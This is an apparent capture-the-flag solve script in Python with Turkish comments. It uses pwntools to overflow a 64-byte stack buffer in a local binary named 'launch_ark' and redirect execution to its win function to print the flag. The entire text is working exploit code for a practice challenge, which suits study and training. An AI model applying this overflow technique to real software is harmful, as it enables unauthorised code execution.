# solve.py
from pwn import *

# 1. Binary'i yükle
binary_path = "./launch_ark"
elf = ELF(binary_path)

# 2. launch_ark() fonksiyonunun adresini al
target_func = elf.symbols['launch_ark']
print(f"[+] launch_ark adresi: {hex(target_func)}")

# 3. Stack düzeni:
# auth_buffer = 64 bayt
# Kaydedilen RBP = 8 bayt
# Toplam ofset = 72 bayt
# Ekstra ret adresi (x86_64 stack 16-byte alignment sorunu icin)
ret_gadget = target_func + 1 # veya binary'deki herhangi bir 'ret' adresi

offset = 72
payload = b"A" * offset + p64(ret_gadget) + p64(target_func)

# 4. Süreci başlat ve payload'u gönder
io = process(binary_path)
io.recvuntil(b"[?] ATESLEME KONTROL PROTOKOLUNU GIRIN: ")
io.sendline(payload)

# 5. Bayrağı yakala
output = io.recvall().decode(errors='ignore')
print(output)